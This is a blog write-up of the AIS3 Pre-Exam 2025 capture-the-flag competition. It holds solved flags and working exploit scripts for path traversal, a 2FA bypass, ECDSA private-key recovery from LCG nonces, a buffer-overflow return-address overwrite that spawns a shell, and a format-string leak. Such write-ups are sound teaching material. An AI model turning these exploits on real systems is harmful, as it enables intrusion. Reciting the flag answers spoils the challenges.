---
title: ( Writeup ) AIS3 Pre-Exam 2025
published: 2025-07-21
description: 'AIS3 Pre-Exam 2025'
image: ''
tags: [Writeup, CTF]
category: 'WriteUps'
draft: false 
---

# AIS3 Pre-Exam 2025 WriteUp
Team: lazyyy ｜ Rank: 74

:::tip[原始附圖 HackMD 連結]
https://hackmd.io/@xiung07/ais3-pre-exam-2025
:::


---
# Misc

## Welcome
### 題目
```!
Copy & Paste ?

You don't know how to copy & paste ???

Let me teach you : Ctrl + c & Ctrl + v 😮‍💨😮‍💨😮‍💨
```
### 思路
* 先 Ctrl + C 然後 Ctrl + V。

Flag: `AIS3{This_Is_Just_A_Fake_Flag_~\~}`

---

## Ramen CTF
### 題目
```!
我在吃 CTF，喔不對，拉麵，但我忘記我在哪間店吃了．．．，請幫我找出來
(P.S. FlagFormat: AIS3{google map 上的店家名稱:我點的品項在菜單上的名稱})
Author: whale120
```
### 思路
* 從發票 7 位賣方統編推至 8 位 `34785923`，查詢到公司名稱及地址後，再至 Google Maps 尋找店家名稱。
* 掃描發票 QR-Code 取得發票號碼。
* 結合其他的發票資訊至發票查詢網站取得商品名稱。

### 附圖
![chal](https://cdn.xiung.me/ais3_pre_exam_2025/ramen.jpg)
Flag: `AIS3{樂山溫泉拉麵:蝦拉麵}`

---

## AIS3 Tiny Server - Web / Misc
### 題目
```!
From 7890/tiny-web-server

I am reading Computer Systems: A Programmer's Perspective.

It teachers me how to write a tiny web server in C.

Non-features

No security check
The flag is at /readable_flag_somerandomstring (root directory of the server). You need to find out the flag name by yourself.

The challenge binary is the same across all AIS3 Tiny Server challenges.

Note: This is a misc (or web) challenge. Do not reverse the binary. It is for local testing only. Run ./tiny -h to see the help message. You may need to install gcc-multilib to run the binary.

Note 2: Do not use scanning tools. You don't need to scan directory.

Challenge Instancer

Warning: Instancer is not a part of the challenge, please do not attack it.

Please solve this challenge locally first then run your solver on the remote instance.

Author: pwn2ooown
```
### 思路
* 多次嘗試後發現路徑遍歷漏洞即 `..%2f`。
* 回到根目錄找到指定檔案的檔名後即可結合路徑遍歷存取。

![image](https://cdn.xiung.me/ais3_pre_exam_2025/tiny_server_web.png)
Flag: `AIS3{tInY_weB_$ervER_w17H_fIl3_8R0Ws1nG_A$_@_fe@turE}
`

---

# Web
## Tomorin db 🐧
### 題目
```!
I make a simple server which store some Tomorin.

Tomorin is cute ~

I also store flag in this file server, too.
```
### 思路
* 多次嘗試後發現路徑遍歷漏洞即 `.%2f`。
* 根據原始碼讀取到相同目錄的 flag 檔案。

![image](https://cdn.xiung.me/ais3_pre_exam_2025/tomorin_db.png)
Flag: `AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}`

---

## Login Screen 1
### 題目
```!
Welcome to my Login Screen! This is your go-to space for important announcements, upcoming events, helpful resources, and community updates. Whether you're looking for deadlines, meeting times, or opportunities to get involved, you'll find all the essential information posted here. Be sure to check back regularly to stay informed and connected!

http://login-screen.ctftime.uk:36368/

Note: The flag starts with AIS3{1.

Author: Ching367436
```
### 思路
* 進到 index.php 登入 Acc / Pwd : admin / admin。
* 轉址到 2fa.php 後，改路徑至 dashboard.php。
* 使用 Burp Suite 查 dashboard.php 的回傳封包即可。

### 回傳封包
```html!
HTTP/1.1 302 Found
Date: Sat, 24 May 2025 05:00:41 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: Express
ETag: W/"86f-oSPkbf9oIjxXhokikR8tx7FSWXs"
Connection: keep-alive, Keep-Alive
Keep-Alive: timeout=5, max=100
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: 2fa.php
Content-Length: 1096
Content-Type: text/html


<!DOCTYPE html>
<html lang="en">
<head>
    <title>Dashboard</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
    <link rel="stylesheet" href="styles.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

<main class="container">
    <h2>Welcome, admin!</h2>

    <h3>Your Previous Posts</h3>

            <div class='box'><strong>2025-05-05</strong><div id='post1' class='post'>Just watched this excellent technical breakdown: https://youtu.be/jWvuUeUyyKU - it's a must-see if you're into cybersecurity, reverse engineering, or low-level internals. The explanations are clear, insightful, and packed with practical takeaways. Highly recommended for anyone looking to deepen their understanding or just enjoy quality analysis.</div></div>;
        <div class='box'><strong>2025-05-06</strong><div id='post2' class='post'>AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}</div></div>;
        </article>
    <a href="logout.php"><button  class="big_button">Logout</button></a>
</main>
</body>
</html>
```
Flag: `AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}`

---

# Crypto

## SlowECDSA
### 題目
```!
I found this Slow version of ECDSA in my drawer, can you spot the bug?

nc chals1.ais3.org 19000
Author: whale120
```
### 思路
* 伺服器提供兩次對固定訊息 `example_msg` 的 ECDSA 簽章，使用同一私鑰與 LCG 產生的隨機數 k。
* 由於 k 是透過線性同餘產生器（LCG）生成的，我們可以透過兩次簽章的 (r1, s1), (r2, s2) 與雜湊值 h，推算出 LCG 狀態與私鑰。
* 根據 ECDSA 公式與 LCG 的關係，使用聯立方程可解出私鑰 x 及 nonce k1, k2。
* 利用 LCG 的遞推式 k3 = a * k2 + c 預測下一次簽名所用的 k3。
* 用已知私鑰 x 和預測的 k3 對 `give_me_flag` 簽章。
* 將偽造的 (r, s) 傳回伺服器驗證，成功取得 flag。

### exploit
```python!
from pwn import remote
import hashlib
from ecdsa import NIST192p, ellipticcurve
from ecdsa.util import number_to_string, string_to_number
from Crypto.Util.number import inverse

HOST, PORT = 'chals1.ais3.org', 19000

a = 1103515245
c = 12345
curve = NIST192p
order = curve.order
G = curve.generator

def sha1_int(m: bytes):
    return int.from_bytes(hashlib.sha1(m).digest(), 'big') % order

def get_sig(p):
    p.sendlineafter(b"option:", b"get_example")
    p.recvuntil(b"r: ")
    r = int(p.recvline().strip(), 16)
    p.recvuntil(b"s: ")
    s = int(p.recvline().strip(), 16)
    return r, s

def solve_priv_k(r1, s1, r2, s2, h):

    D = (s1 * r2 - a * s2 * r1) % order
    invD = inverse(D, order)

    B1 = (-h) % order
    B2 = (s2 * c - h) % order

    num_x  = (h * a * s2 + s1 * B2) % order
    x      = (num_x * invD) % order

    num_k1 = (r1 * B2 + r2 * h) % order
    k1     = (num_k1 * invD) % order

    k2 = (a * k1 + c) % order

    return x, k1, k2


def sign_msg(x, k, msg: bytes):
    h = sha1_int(msg)
    R = k * G
    r = R.x() % order
    s = (inverse(k, order) * (h + r * x)) % order
    return r, s

def main():

    p = remote(HOST, PORT)

    r1, s1 = get_sig(p)
    r2, s2 = get_sig(p)

    example_msg = b"example_msg"
    h = sha1_int(example_msg)

    x, k1, k2 = solve_priv_k(r1, s1, r2, s2, h)

    r1_, s1_ = sign_msg(x, k1, example_msg)
    r2_, s2_ = sign_msg(x, k2, example_msg)
    assert (r1_,s1_) == (r1,s1) and (r2_,s2_) == (r2,s2)
    
    k3 = (a * k2 + c) % order

    target = b"give_me_flag"
    r3, s3 = sign_msg(x, k3, target)

    p.sendlineafter(b"option:", b"verify")
    p.sendlineafter(b"Enter message:", target)
    p.sendlineafter(b"Enter r", hex(r3).encode())
    p.sendlineafter(b"Enter s", hex(s3).encode())

    print(p.recvuntil(b"}".decode()))

if __name__ == "__main__":
    main()

```
Flag: `AIS3{Aff1n3_nounc3s_c@N_bE_broke_ezily...}`

---

## Stream
### 題目
```!
I love streaming randomly online!

Author : Whale120
```
### 思路
* 將最後一行 output 從 16 進制轉為 10 進制方便運算。
* output_int 為 flag 轉換為數字後與 $b^2$ XOR 後的結果。
* output_int 與 $b^2$ 十分接近，可開根號來估算 $b$ 值。
* $b$ 值接近但不等於開根號後的值，故反覆增加直到數字等於 flag 的前綴。

### exploit
```python!
import math

with open("./output.txt", "r") as f:
	lines = f.readlines()
	output_hex = lines[-1].strip()[2:]
output_int = int(output_hex, 16)

n = 256 
k = 256 
high_k = output_int >> k
A = high_k << k
B = (high_k + 1) << k

left = math.isqrt(A)
if left ** 2 < A:
	left += 1
right = math.isqrt(B - 1)
while right ** 2 >= B:
	right -= 1

for b in range(left, right + 1):
	y = b ** 2
	candidate_x = output_int ^ y
	for m in range(1, 101):
		try:
			flag_bytes = candidate_x.to_bytes(m, 'big')
			if flag_bytes.startswith(b'AIS3{') and flag_bytes.endswith(b'}') and all(32 <= c < 127 for c in flag_bytes):
				print(flag_bytes.decode('ascii'))
				return
		except OverflowError:
			continue
```
Flag: `AIS3{no_more_junks...plz}`

---

# Reverse

## web flag checker
### 題目
```!
Just a web flag checker

http://chals1.ais3.org:29998

Author: Chumy
```
### 思路
* 發現 `flagchecker` 函數接受記憶體指標作為輸入。
* 呼叫函式檢查輸入長度，必須為 40 字節。
* 旗標被分為 5 個 8 字節塊，每塊作為 64 位整數處理。
* 發現每個塊進行了左旋轉位移，旋轉量由常數 -39934163 計算，依次為 45、28、42、39、61 位。
* 逆向對每個值進行右旋轉位移，計算原始 64 位整數。
* 使用 little endian 將每個整數轉為 8 bytes 字串，合併成 40 bytes 的 flag。

### exploit
```python!
import struct

X = [7577352992956835434, 7148661717033493303, -7081446828746089091, -7479441386887439825, 8046961146294847270]
rot_amount = [45, 28, 42, 39, 61]

flag = b''
for i in range(5):
    x = X[i] & 0xFFFFFFFFFFFFFFFF
    k = rot_amount[i]
    c = ((x >> k) | (x << (64 - k))) & 0xFFFFFFFFFFFFFFFF
    chunk = struct.pack('<Q', c)
    flag += chunk

print(flag.decode('ascii'))
```
Flag: `AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}`

---

## AIS3 Tiny Server - Reverse
### 題目
```!
Find the secret flag checker in the server binary itself and recover the flag.

The challenge binary is the same across all AIS3 Tiny Server challenges.

Please download the binary from the "AIS3 Tiny Server - Web / Misc" challenge.

This challenge doesn't depend on the "AIS3 Tiny Server - Pwn" and can be solved independently.

It is recommended to solve this challenge locally.

Author: pwn2ooown
```
### 思路
* 使用 IDA 分析後，可發現 flag 驗證成功的內容。
![image](https://cdn.xiung.me/ais3_pre_exam_2025/tiny_server_reverse_1.png)
* 追進 `sub_1E20` 後可發現 XOR 加密函式。
![image](https://cdn.xiung.me/ais3_pre_exam_2025/tiny_server_reverse_2.png)
* 逆向逐個將 v8 解密出來，如 exploit 程式

### exploit
```python!
import struct

v8_raw = [
    1480073267,
    1197221906,
    254628393,
    920154,
    1343445007,
    874076697,
    1127428440,
    1510228243,
    743978009,
    54940467,
    1246382110
]

v8_bytes = bytearray()
for val in v8_raw:
    v8_bytes.extend(struct.pack("<I", val))

key = b"rikki_l0v3"
flag = bytearray()
v2 = 51
v3 = 114

for i in range(45):
    decrypted = v2 ^ v3
    flag.append(decrypted)
    if i + 1 < len(v8_bytes):
        v2 = v8_bytes[i + 1]
    v3 = key[(i + 1) % 10]

print(flag.decode("utf-8"))

```
Flag: `AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!#}`

---

# Pwn

## Welcome to the World of Ave Mujica🌙
### 題目
```!
Flag 在 /flag，這題的 flag 有 Unicode 字元，請找到 flag 之後直接提交到平台上，如果因為一些玄學問題 CTFd 送不過請 base64 flag 出來用 CyberChef decode 應該就可以了

Instancer

請先在本地測試並確定能成功攻擊後再開 instance

若同時參加兩場比賽，輸入任意一個 CTFd 的 token 皆可啟動 instance

Instancer 並非題目的一部分，請勿攻擊 Instancer。發現問題請回報 admin

Author: pwn2ooown
```
### 思路
* 使用 IDA 分析後，可知 `main` function 會在詢問 "你願意把剩餘的人生交給我嗎?" 並判斷輸入值是否為 yes 之後，輸出 "告訴我你的名字的長度:" 並呼叫 `read_int8()` 讀入整數。
* 最後 `read(0, buf, int8)` 讀入 `int8` 大小的內容，此時若 `int8` 為 -1，`read` 將讀入 `size_t` 的最大值。
![image](https://cdn.xiung.me/ais3_pre_exam_2025/mujica_1.png)
* 在 IDA 中可發現一個取得 shell 的函式。
![image](https://cdn.xiung.me/ais3_pre_exam_2025/mujica_2.png)
* 取得此函式的記憶體位址 `0x401256`。
![image](https://cdn.xiung.me/ais3_pre_exam_2025/mujica_3.png)
* 注入約 200 字的內容，直到覆蓋 `$rsp` 並計算 offset 為 168。
![image](https://cdn.xiung.me/ais3_pre_exam_2025/mujica_4.png)
* 將 offset 及要將 rsp 覆蓋到指定的記憶體位址寫入，如 exploit 程式。

### exploit
```python!
from pwn import *

#r = process('./chal')
r = remote('chals1.ais3.org', 60202)

r.recvuntil(')')
r.recvline()
r.sendline(b"yes")
r.sendlineafter("度: ", "-1")
r.sendlineafter("字: ", b"A"*168 + p64(0x0000000000401256))
r.interactive()
r.close()
```
![image](https://cdn.xiung.me/ais3_pre_exam_2025/mujica_5.png)
Flag: `AIS3{Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)...Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)..._810f41aaae33fd68ef44d707078be799}`

---

## Format Number
### 題目
```!
Print the number in the format you like !

nc chals1.ais3.org 50960


Author : Curious
```
### 思路
* 由原始碼可知，"What format do you want ?" 後讀入的值僅限為數字或符號。
* 原始碼 `printf(buffer, "Welcome", "~~~", number)` 的前三個參數都在暫存器上，若沒有提供參數則會從 stack 中抓取。
* 開頭 `%3$` 與結尾 `d` 代表在第三個參數上 (number) 顯示，並以 10 進制輸出。 
* 使用 `.*{20}$`，意思為將第 20 個參數的值作為數字的寬度。
* 算出回傳數字的長度即為第 N 個參數的 ASCII 值。
* 逐次嘗試後發現第 20 個參數開始有 flag 的特徵，故如 exploit 程式。
### exploit
```python!
from pwn import *
flag = ""
for i in range(0, 40):
    idx = 20 + i
    fmt = f".*{idx}$".encode()
    io = remote('chals1.ais3.org', 50960)
    io.recvuntil(b"What format do you want ?")
    io.sendline(fmt)
    out = io.recvline().decode()
    io.close()
    printed = out.split("Format number : ")[1].strip()
    leaked = len(printed)
    flag += chr(leaked)
print(flag)
```
![image](https://cdn.xiung.me/ais3_pre_exam_2025/format_number.png)
Flag: `AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&_!!!}`